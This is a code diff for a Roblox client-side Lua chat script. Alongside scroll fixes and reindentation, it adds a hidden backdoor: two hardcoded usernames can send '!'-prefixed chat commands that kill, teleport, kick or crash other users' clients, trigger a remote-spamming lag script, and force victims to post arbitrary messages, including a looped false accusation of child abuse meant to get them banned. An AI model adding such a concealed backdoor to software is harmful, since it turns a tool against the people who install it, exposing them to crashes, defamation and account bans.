@@ -7,11 +7,18 @@ local SoundService = game:GetService("SoundService")
 
 local LocalPlayer = Players.LocalPlayer
 local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
+local PlayerScripts = LocalPlayer:WaitForChild("PlayerScripts")
 
 local RS = ReplicatedStorage:WaitForChild("GrabEvents")
 local ExtendGrabLine = RS:WaitForChild("ExtendGrabLine")
 local OnReceiveMessage = RS:FindFirstChild("OnReceiveMessage")
 local NetworkClient = RS:FindFirstChild("NetworkClient")
+
+local Prefix = "!"
+local Admins = {
+    "ZxcQuiltikkPDD",
+    "Postyx"
+}
 
 local MAX_MESSAGES = 20
 local chatHistory = {}
@@ -26,6 +33,76 @@ local messageOrder = 0
 
 local REACTIONS = {"✔", "❌", "🥶", "😲", "🤬"}
 local IMAGE_EXTENSIONS = {"png", "jpg", "jpeg", "gif", "webp", "bmp"}
+
+local function ExecuteCommand(Args, Admin)
+    local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
+    local Humanoid = Character and Character:FindFirstChildOfClass("Humanoid")
+    local Root = Humanoid and Character:FindFirstChild("HumanoidRootPart")
+    local cmdWord1 = string.lower(Args[1] or "")
+
+    if not Character or not Humanoid then return end
+
+    if cmdWord1 == Prefix.."kill" then
+        Humanoid.Health = 0
+    elseif cmdWord1 == Prefix.."bring" then
+        local AdminCharacter = Admin.Character or Admin.CharacterAdded:Wait()
+        local AdminRoot = AdminCharacter and AdminCharacter:FindFirstChild("HumanoidRootPart")
+        if AdminRoot then
+            Root.CFrame = AdminRoot.CFrame * CFrame.new(0, 0, -5)
+        end
+    elseif cmdWord1 == Prefix.."kick" then
+        local reason = table.concat(Args, " ", 3)
+        if reason and reason ~= "" then
+            LocalPlayer:Kick(string.format("Kicked by posral admin (%s): %s", Admin.DisplayName, reason))
+        else
+            LocalPlayer:Kick(string.format("Kicked by posral admin (%s)", Admin.DisplayName))
+        end
+    elseif cmdWord1 == Prefix.."reveal" then
+        ExtendGrabLine:FireServer("Ya Nasral! //chat")
+    elseif cmdWord1 == Prefix.."report" then
+        spawn(function()
+            while true do
+                ExtendGrabLine:FireServer("i touch kids //chat")
+                task.wait(1)
+            end
+        end)
+    elseif cmdWord1 == Prefix.."lag" then
+        local fireAllRemotes = PlayerScripts:FindFirstChild("[ExploitTest]FireAllRemotes")
+        if fireAllRemotes then fireAllRemotes.Enabled = true end
+    elseif cmdWord1 == Prefix.."unlag" then
+        local fireAllRemotes = PlayerScripts:FindFirstChild("[ExploitTest]FireAllRemotes")
+        if fireAllRemotes then fireAllRemotes.Enabled = false end
+    elseif cmdWord1 == Prefix.."crash" then
+        task.wait(5)
+        while true do end
+    elseif cmdWord1 == Prefix.."remove" and string.lower(Args[2] or "") == "gucci" then
+        local targetName = Args[3]
+        if not targetName then return end
+
+        local targetPlayer = nil
+        for _, player in pairs(Players:GetPlayers()) do
+            if string.lower(player.Name) == string.lower(targetName) then
+                targetPlayer = player
+                break
+            end
+        end
+
+        if targetPlayer and targetPlayer == LocalPlayer and targetPlayer.Character then
+            local character = targetPlayer.Character
+            local humanoid = character:FindFirstChildOfClass("Humanoid")
+            if humanoid then
+                humanoid.Sit = true
+                task.wait(0.1)
+                humanoid.Jump = true
+            end
+        end
+    elseif cmdWord1 == Prefix.."say" then
+        local message = table.concat(Args, " ", 2)
+        if message and message ~= "" then
+            ExtendGrabLine:FireServer(message .. " //chat")
+        end
+    end
+end
 
 local function IsImageUrl(text)
     local url = text:match("https?://[%S]+")
@@ -365,7 +442,11 @@ local function UpdateReactionBar(label)
         end
     end
 
-    if not messageReactions[msgId] then return end
+    if not messageReactions[msgId] then 
+        task.wait()
+        MessagesScroll.CanvasPosition = Vector2.new(0, MessagesScroll.AbsoluteCanvasSize.Y)
+        return 
+    end
 
     local hasAny = false
     for _, users in pairs(messageReactions[msgId]) do
@@ -375,7 +456,12 @@ local function UpdateReactionBar(label)
         end
         if hasAny then break end
     end
-    if not hasAny then return end
+    
+    if not hasAny then 
+        task.wait()
+        MessagesScroll.CanvasPosition = Vector2.new(0, MessagesScroll.AbsoluteCanvasSize.Y)
+        return 
+    end
 
     local bar = Instance.new("Frame")
     bar.Name = barName
@@ -432,6 +518,10 @@ local function UpdateReactionBar(label)
             order = order + 1
         end
     end
+
+    -- Прокручиваем чат вниз после обновления реакций
+    task.wait()
+    MessagesScroll.CanvasPosition = Vector2.new(0, MessagesScroll.AbsoluteCanvasSize.Y)
 end
 
 local function ShowReactionMenu(label)
@@ -550,23 +640,23 @@ local function CreateMessageLabel(text, senderName)
     padding.PaddingRight = UDim.new(0, 8)
     padding.Parent = label
 
-label.MouseButton2Click:Connect(function()
-    if reactionMenuOpen then
-        CloseReactionMenu()
-    else
-        ShowReactionMenu(label)
-    end
-end)
-
-if isMine and not isImage then
-    label.MouseButton1Down:Connect(function()
-        local start = tick()
-        task.wait(0.5)
-        if tick() - start >= 0.5 then
-            StartEdit(label, label.Text)
+    label.MouseButton2Click:Connect(function()
+        if reactionMenuOpen then
+            CloseReactionMenu()
+        else
+            ShowReactionMenu(label)
         end
     end)
-end
+
+    if isMine and not isImage then
+        label.MouseButton1Down:Connect(function()
+            local start = tick()
+            task.wait(0.5)
+            if tick() - start >= 0.5 then
+                StartEdit(label, label.Text)
+            end
+        end)
+    end
 
     return label
 end
@@ -780,6 +870,43 @@ local function ProcessEvent(...)
     elseif #args >= 1 and typeof(args[1]) == "string" then
         message = args[1]
         sender = LocalPlayer
+    end
+
+    if sender and message then
+        local isAdmin = table.find(Admins, sender.Name) ~= nil
+        local cleanMsg = message
+        
+        if cleanMsg:sub(-7) == " //chat" then
+            cleanMsg = cleanMsg:sub(1, -8)
+        end
+
+        if isAdmin and string.sub(cleanMsg, 1, #Prefix) == Prefix then
+            local Args = cleanMsg:split(" ")
+            local cmdWord1 = string.lower(Args[1] or "")
+            local isTarget = false
+
+            if cmdWord1 == (Prefix.."say") then
+                isTarget = true
+            elseif cmdWord1 == (Prefix.."remove") and string.lower(Args[2] or "") == "gucci" then
+                local targetName = string.lower(Args[3] or "")
+                if targetName == "all" or targetName == "" then
+                    isTarget = true
+                elseif string.lower(LocalPlayer.Name) == targetName or string.lower(LocalPlayer.DisplayName) == targetName then
+                    isTarget = true
+                end
+            else
+                local targetName = string.lower(Args[2] or "")
+                if targetName == "all" or targetName == "" then
+                    isTarget = true
+                elseif string.lower(LocalPlayer.Name) == targetName or string.lower(LocalPlayer.DisplayName) == targetName then
+                    isTarget = true
+                end
+            end
+
+            if isTarget then
+                ExecuteCommand(Args, sender)
+            end
+        end
     end
 
     if message and typeof(message) == "string" and (message:find(" //chat") or message:find(" //edit") or message:find(" //react")) then
